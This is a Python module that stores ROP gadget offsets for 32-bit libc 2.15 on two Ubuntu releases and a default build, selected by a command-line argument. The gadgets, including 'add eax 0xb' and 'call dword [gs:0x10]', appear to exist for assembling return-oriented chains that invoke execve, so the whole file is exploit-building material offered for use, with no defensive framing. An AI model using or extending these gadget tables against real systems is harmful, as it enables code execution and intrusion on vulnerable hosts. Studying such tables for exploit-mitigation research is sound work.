import sys

"""
This is to store the gadgets that have been found.

TODO: Automate it using ropeme
"""

mov_edx_eax = ''
pop_ecx_pop_ebx = ''
add_eax_b = ''
pop_ecx_pop_eax = ''
mov_eax_ecx = ''
pop_ebx_ret = ''
xor_eax_eax = ''
pop_ecx_pop_edx = ''
mov_pedx_eax_mov_eax_edx = ''
mov_edx_eax_mov_eax_edx = ''
mov_ebx_edx = ''
xor_edx_edx_mov_eax_edx = ''
mov_eax_0x2 = ''
mov_eax_0x4 = ''
mov_ecx_eax_mov_edx_ecx_pop_ebx = ''
inc_eax = ''
mov_eax_0x6 = ''
add_eax_0x4 = ''
add_eax_0x5 = ''
add_eax_0x8 = ''
add_eax_0x10 = ''
add_eax_0x20 = ''
add_eax_0x30 = ''
call_gs_10 = ''

def init(name=None):

    global mov_edx_eax
    global pop_ecx_pop_ebx
    global add_eax_b
    global pop_ecx_pop_eax
    global mov_eax_ecx
    global pop_ebx_ret
    global xor_eax_eax
    global pop_ecx_pop_edx
    global mov_pedx_eax_mov_eax_edx
    global mov_edx_eax_mov_eax_edx
    global mov_ebx_edx
    global xor_edx_edx_mov_eax_edx
    global mov_eax_0x2
    global mov_eax_0x4
    global mov_ecx_eax_mov_edx_ecx_pop_ebx
    global inc_eax
    global mov_eax_0x6
    global add_eax_0x4
    global add_eax_0x5
    global add_eax_0x8
    global add_eax_0x10
    global add_eax_0x20
    global add_eax_0x30
    global call_gs_10

    if sys.argv[1] == 'ubuntu12.04-libc2.15':
        mov_edx_eax = 'ROP command: 0x8d5e4L: mov [edx] eax ; mov eax edx ;;\\n'
        pop_ecx_pop_ebx = 'ROP command: 0xfca82L: pop ecx ; pop ebx ;;\\n'
        add_eax_b = 'ROP command: 0x148428L: add eax 0xb ;;\\n'
        pop_ecx_pop_eax = 'ROP command: 0xf2d21L: pop ecx ; pop eax ;;\\n'
        mov_eax_ecx = 'ROP command: 0x2d987L: mov [eax] ecx ;;\\n'
        pop_ebx_ret = 'ROP command: 0x1930eL: pop ebx ;;\\n'
        xor_eax_eax = 'ROP command: 0x34154L: xor eax eax ;;\\n'
        pop_ecx_pop_edx = 'ROP command: 0x2df7bL: pop ecx ; pop edx ;;\\n'
        mov_pedx_eax_mov_eax_edx = 'ROP command: 0x85fd2L: mov [edx] eax ; mov eax edx ;;\\n'
        mov_edx_eax_mov_eax_edx = 'ROP command: 0x12052fL: mov edx eax ; mov eax edx ;; \\n'
        mov_ebx_edx = 'ROP command: 0xddd42L: mov ebx edx ;;\\n'
        xor_edx_edx_mov_eax_edx = 'ROP command: 0x83525L: xor edx edx ; mov eax edx ;;\\n'
        mov_eax_0x2 = 'ROP command: 0xa78a0L: mov eax 0x2 ;;\\n'
        mov_eax_0x4 = 'ROP command: 0xa78c0L: mov eax 0x4 ;;\\n'
        mov_ecx_eax_mov_edx_ecx_pop_ebx = 'ROP command: 0x13d762L: mov ecx [eax] ; mov [edx] ecx ; pop ebx ;;\\n'
        mov_eax_0x4 = 'ROP command: 0xa78c0L: mov eax 0x4 ;;\\n'
        inc_eax = 'ROP command: 0x64fcL: inc eax ;;\\n'
        mov_eax_0x6 = 'ROP command: 0xa78e0L: mov eax 0x6 ;;\\n'
        add_eax_0x4 = 'ROP command: 0x14840cL: add eax 0x4 ;;\\n'
        add_eax_0x5 = 'ROP command: 0x148410L: add eax 0x5 ;;\\n'
        add_eax_0x8 = 'ROP command: 0x98c50L: add eax 0x8 ;;\\n'
        add_eax_0x10 = 'ROP command: 0x847e8L: add eax 0x10 ; pop edi ; pop esi ;;\\n'
        add_eax_0x20 = 'ROP command: 0x847f5L: add eax 0x20 ; pop edi ; pop esi ;;\\n'
        add_eax_0x30 = 'ROP command: 0x84802L: add eax 0x30 ; pop edi ; pop esi ;;\\n'
        call_gs_10 = 'ROP command: 0xb8da5L: call dword [gs:0x10] ;;\\n'

    elif sys.argv[1] == 'ubuntu12.10-libc2.15':
        pop_ecx_pop_eax = 'ROP command: 0xf2c81L: pop ecx ; pop eax ;;\\n'
        mov_eax_ecx = 'ROP command: 0x2d71fL: mov [eax] ecx ;;\\n'
        xor_eax_eax = 'ROP command: 0x32eb0L: xor eax eax ;;\\n'
        pop_ecx_pop_edx = 'ROP command: 0x2df7bL: pop ecx ; pop edx ;;\\n'
        mov_edx_eax = 'ROP command: 0x85f14L: mov [edx] eax ; mov eax edx ;;\\n'
        pop_ecx_pop_ebx = 'ROP command: 0xfc9e2L: pop ecx ; pop ebx ;;\\n'
        add_eax_b = 'ROP command: 0x148366L: add eax 0xb ;;\\n'
        call_gs_10 = 'ROP command: 0xb8d05L: call dword [gs:0x10] ;;'

    else:
        mov_edx_eax = 'ROP command: 0x113371L: mov [edx] eax ; xor eax eax ;;\\n'
        pop_ecx_pop_ebx = 'ROP command: 0xff102L: pop ecx ; pop ebx ;;\\n'
        add_eax_b = 'ROP command: 0x14da28L: add eax 0xb ;;\\n'
        pop_ecx_pop_eax = 'ROP command: 0xf5160L: pop ecx ; pop eax ;;\\n'
        mov_eax_ecx = 'ROP command: 0x2e09fL: mov [eax] ecx ;;\\n'
        pop_ebx_ret = 'ROP command: 0x742aeL: pop ebx ; ret ;\\n'
        xor_eax_eax = 'ROP command: 0x34964L: xor eax eax ;;\\n'
        pop_ecx_pop_edx = 'ROP command: 0x2e8bbL: pop ecx ; pop edx ;;\\n'
        mov_pedx_eax_mov_eax_edx = 'ROP command: 0x8e034L: mov [edx] eax ; mov eax edx ;;\\n'
        mov_edx_eax_mov_eax_edx = 'ROP command: 0x122339L: mov edx eax ; mov eax edx ;; \\n'
        mov_ebx_edx = 'ROP command: 0xdf572L: mov ebx edx ;;\\n'
        xor_edx_edx_mov_eax_edx = 'ROP command: 0x83f67L: xor edx edx ; mov eax edx ;;\\n'
        mov_eax_0x2 = 'ROP command: 0x1171f0L: mov eax 0x2 ;;\\n'
        mov_eax_0x4 = 'ROP command: 0xa9a10L: mov eax 0x4 ;;\\n'
        mov_ecx_eax_mov_edx_ecx_pop_ebx = 'ROP command: 0x143f2cL: mov ecx [eax] ; mov [edx] ecx ; pop ebx ;;\\n'
        mov_eax_0x4 = 'ROP command: 0xa9a10L: mov eax 0x4 ;;\\n'
        inc_eax = 'ROP command: 0x41e3aL: inc eax ;;\\n'
        mov_eax_0x6 = 'ROP command: 0xa9a30L: mov eax 0x6 ;;\\n'
        add_eax_0x4 = 'ROP command: 0x14da0cL: add eax 0x4 ;;\\n'
        add_eax_0x5 = 'ROP command: 0x14da10L: add eax 0x5 ;;\\n'
        add_eax_0x8 = 'ROP command: 0x113988L: add eax 0x8 ;;\\n'
        add_eax_0x10 = 'ROP command: 0x85238L: add eax 0x10 ; pop edi ; pop esi ;;\\n'
        add_eax_0x20 = 'ROP command: 0x85245L: add eax 0x20 ; pop edi ; pop esi ;;\\n'
        add_eax_0x30 = 'ROP command: 0x85252L: add eax 0x30 ; pop edi ; pop esi ;;\\n'
        call_gs_10 = 'ROP command: 0xbaa75L: call dword [gs:0x10] ;;\\n'